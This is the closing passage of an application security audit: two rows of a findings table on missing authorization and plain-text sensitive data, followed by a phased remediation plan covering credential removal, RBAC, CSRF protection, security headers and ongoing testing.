| **No Authorization Enforcement** | Privilege escalation, no access control | Implement RBAC with roles/permissions, audit all access | 🔴 CRITICAL |
| **Sensitive Data in Plain Text** | Man-in-the-middle, client compromise | Secure headers, CSRF tokens, environment configuration | 🔴 CRITICAL |

---

# Recommended Remediation Timeline

**Phase 1 (Immediate - 24 hours):**
- Remove hardcoded credentials from source code
- Implement secure cookie flags on all endpoints
- Add `[Authorize]` to all sensitive endpoints
- Remove `eval()` usage and implement XSS protection

**Phase 2 (This Week):**
- Migrate to API key-based authentication with database storage
- Implement RBAC with roles and permissions
- Add CSRF token protection
- Disable Swagger UI in production

**Phase 3 (This Sprint):**
- Implement comprehensive audit logging
- Add security headers to all responses
- Set up environment-based configuration
- Conduct security review of all endpoints

**Phase 4 (Ongoing):**
- Regular security testing and penetration testing
- Dependency vulnerability scanning
- Security training for development team
- Incident response procedures

---

This analysis provides production-ready code examples and best practices for securing your application. Each issue addresses a real-world attack vector with complete remediation guidance.
